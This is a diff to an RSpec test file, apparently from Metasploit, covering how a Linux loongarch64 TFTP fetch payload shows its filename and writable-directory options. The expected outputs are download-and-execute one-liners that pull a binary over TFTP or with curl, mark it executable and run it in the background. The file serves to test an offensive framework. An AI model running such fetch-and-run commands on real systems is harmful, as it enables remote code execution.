@@ -22,9 +22,22 @@ RSpec.describe 'cmd/linux/tftp/loongarch64' do
     )
   end
 
-  it 'uses the URI for the local TFTP filename without destination options' do
-    expect(payload.options).not_to include('FETCH_FILENAME', 'FETCH_WRITABLE_DIR')
+  it 'uses the URI for the local TFTP filename without using destination options' do
+    expect(payload.options).to include('FETCH_FILENAME', 'FETCH_WRITABLE_DIR')
+    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_FILENAME'])).to be(false)
+    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_WRITABLE_DIR'])).to be(false)
     expect(payload.options.validate(payload.datastore)).to be(true)
     expect(payload.generate).to eq('(echo binary ; echo get payload ) | tftp 192.0.2.2; chmod +x ./payload; ./payload &')
+  end
+
+  it 'uses destination options for curl TFTP fetches' do
+    payload.datastore.merge!(
+      'FETCH_COMMAND' => 'CURL', 'FETCH_FILENAME' => 'stored_payload',
+      'FETCH_WRITABLE_DIR' => '/tmp'
+    )
+
+    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_FILENAME'])).to be(true)
+    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_WRITABLE_DIR'])).to be(true)
+    expect(payload.generate).to eq('curl -so /tmp/stored_payload tftp://192.0.2.2:69/payload;chmod +x /tmp/stored_payload;/tmp/stored_payload&')
   end
 end
